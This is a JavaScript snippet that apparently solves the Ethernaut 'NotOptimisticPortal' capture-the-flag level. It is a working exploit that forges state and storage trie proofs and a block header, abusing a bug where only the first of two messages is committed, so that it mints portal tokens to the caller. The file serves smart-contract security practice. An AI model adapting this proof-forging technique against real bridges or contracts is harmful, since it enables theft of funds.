/*
 * NotOptimisticPortal Ethernaut challenge helper.
 *
 * Run this file as a Chrome DevTools Snippet on the Ethernaut page with the
 * correct wallet/network selected. It prepares and simulates the transaction,
 * but it does not broadcast automatically.
 *
 * After a successful simulation, submit explicitly with:
 *
 *   await submitChallenge()
 */

(async () => {
  const PORTAL_ADDRESS = "0x6e146aEc27795CC9a5E60fB4e10eD0A553C37bE6";
  const HELPER_ADDRESS = "0x0Ae491cBEf917f946ae12BED364b27376D8a5793";
  const L2_TARGET = "0x4242424242424242424242424242424242424242";
  const MESSAGE_SELECTOR = "0x3a69197e";

  async function loadEthers() {
    if (globalThis.ethersLib) return globalThis.ethersLib;
    if (globalThis.ethers) return globalThis.ethers;

    const module = await import(
      "https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.esm.min.js"
    );
    return module.ethers;
  }

  const ethersLib = await loadEthers();
  globalThis.ethersLib = ethersLib;

  if (!globalThis.ethereum) {
    throw new Error("No injected wallet found. Open this in a wallet-enabled browser.");
  }

  const provider = new ethersLib.providers.Web3Provider(globalThis.ethereum, "any");
  await provider.send("eth_requestAccounts", []);

  const signer = provider.getSigner();
  const recipient = await signer.getAddress();
  const network = await provider.getNetwork();

  const [portalCode, helperCode] = await Promise.all([
    provider.getCode(PORTAL_ADDRESS),
    provider.getCode(HELPER_ADDRESS),
  ]);

  if (portalCode === "0x") {
    throw new Error("Portal has no bytecode on the selected network.");
  }
  if (helperCode === "0x") {
    throw new Error("Helper has no bytecode on the selected network.");
  }

  const portal = new ethersLib.Contract(
    PORTAL_ADDRESS,
    [
      "function latestBlockHash() view returns (bytes32)",
      "function latestBlockNumber() view returns (uint256)",
      "function latestBlockTimestamp() view returns (uint256)",
      "function bufferCounter() view returns (uint16)",
      "function balanceOf(address) view returns (uint256)",
      "function executeMessage(address,uint256,address[],bytes[],uint256,(bytes stateTrieProof,bytes storageTrieProof,bytes accountStateRlp),uint16)",
    ],
    signer,
  );

  const abi = ethersLib.utils.defaultAbiCoder;
  const RLP = ethersLib.utils.RLP;
  const keccak256 = ethersLib.utils.keccak256;
  const zero32 = ethersLib.constants.HashZero;

  const [parentHash, parentNumber, parentTimestamp, bufferIndex] =
    await Promise.all([
      portal.latestBlockHash(),
      portal.latestBlockNumber(),
      portal.latestBlockTimestamp(),
      portal.bufferCounter(),
    ]);

  const amount = ethersLib.utils.parseEther("1");
  const salt = ethersLib.BigNumber.from(
    keccak256(
      ethersLib.utils.toUtf8Bytes(
        `ethernaut-${Date.now()}-${recipient}`,
      ),
    ),
  );

  // For a two-item array, the buggy contract commits only index zero.
  const firstData =
    MESSAGE_SELECTOR + abi.encode(["address"], [HELPER_ADDRESS]).slice(2);

  const receiverHash = keccak256(
    abi.encode(["bytes32", "address"], [zero32, PORTAL_ADDRESS]),
  );
  const dataHash = keccak256(
    abi.encode(["bytes32", "bytes"], [zero32, firstData]),
  );
  const withdrawalHash = keccak256(
    abi.encode(
      ["address", "uint256", "bytes32", "bytes32", "uint256"],
      [recipient, amount, receiverHash, dataHash, salt],
    ),
  );

  const leafPath = (key) => `0x20${keccak256(key).slice(2)}`;

  // Build a single-leaf storage trie containing withdrawalHash => 0x01.
  const storageLeaf = RLP.encode([leafPath(withdrawalHash), "0x01"]);
  const storageRoot = keccak256(storageLeaf);
  const storageTrieProof = RLP.encode([storageLeaf]);

  // Ethereum account state: [nonce, balance, storageRoot, codeHash].
  const accountStateRlp = RLP.encode([
    "0x",
    "0x",
    storageRoot,
    keccak256("0x"),
  ]);

  // Build a single-leaf state trie containing the synthetic L2 target.
  const stateLeaf = RLP.encode([leafPath(L2_TARGET), accountStateRlp]);
  const stateRoot = keccak256(stateLeaf);
  const stateTrieProof = RLP.encode([stateLeaf]);

  // BigNumber#toHexString keeps valid even-length byte encoding here.
  const rlpUint = (value) => ethersLib.BigNumber.from(value).toHexString();
  const rlpBlockHeader = RLP.encode([
    parentHash,
    zero32,
    ethersLib.constants.AddressZero,
    stateRoot,
    zero32,
    zero32,
    ethersLib.utils.hexZeroPad("0x00", 256),
    "0x",
    rlpUint(parentNumber.add(1)),
    "0x",
    "0x",
    rlpUint(parentTimestamp.add(1)),
  ]);

  const helperInterface = new ethersLib.utils.Interface([
    "function onMessageReceived(bytes)",
  ]);
  const helperPayload = abi.encode(
    ["address", "bytes"],
    [PORTAL_ADDRESS, rlpBlockHeader],
  );
  const secondData = helperInterface.encodeFunctionData("onMessageReceived", [
    helperPayload,
  ]);

  const prepared = {
    portal,
    recipient,
    amount,
    messageReceivers: [PORTAL_ADDRESS, HELPER_ADDRESS],
    messageData: [firstData, secondData],
    salt,
    proofs: {stateTrieProof, storageTrieProof, accountStateRlp},
    bufferIndex,
    parentHash,
    withdrawalHash,
    stateRoot,
  };

  await portal.callStatic.executeMessage(
    prepared.recipient,
    prepared.amount,
    prepared.messageReceivers,
    prepared.messageData,
    prepared.salt,
    prepared.proofs,
    prepared.bufferIndex,
  );

  globalThis.challengeAttack = prepared;
  globalThis.submitChallenge = async () => {
    const attack = globalThis.challengeAttack;
    if (!attack) throw new Error("Run challenge.js again to prepare the transaction.");

    const [currentHash, currentBuffer] = await Promise.all([
      attack.portal.latestBlockHash(),
      attack.portal.bufferCounter(),
    ]);
    if (
      currentHash !== attack.parentHash ||
      !currentBuffer.eq(attack.bufferIndex)
    ) {
      throw new Error("Portal state changed. Run challenge.js again before submitting.");
    }

    const transaction = await attack.portal.executeMessage(
      attack.recipient,
      attack.amount,
      attack.messageReceivers,
      attack.messageData,
      attack.salt,
      attack.proofs,
      attack.bufferIndex,
    );
    console.log("Transaction submitted:", transaction.hash);

    const receipt = await transaction.wait();
    const balance = await attack.portal.balanceOf(attack.recipient);
    console.log("Transaction confirmed:", receipt.transactionHash);
    console.log("Portal-token balance:", balance.toString());
    return receipt;
  };

  console.log("Challenge transaction prepared and simulated successfully.");
  console.log({
    chainId: network.chainId,
    recipient,
    portalAddress: PORTAL_ADDRESS,
    helperAddress: HELPER_ADDRESS,
    parentHash,
    parentNumber: parentNumber.toString(),
    parentTimestamp: parentTimestamp.toString(),
    bufferIndex: bufferIndex.toString(),
    withdrawalHash,
    stateRoot,
    amount: amount.toString(),
  });
  console.log("To broadcast explicitly, run: await submitChallenge()");
})().catch((error) => {
  console.error("Challenge preparation failed:", error);
});
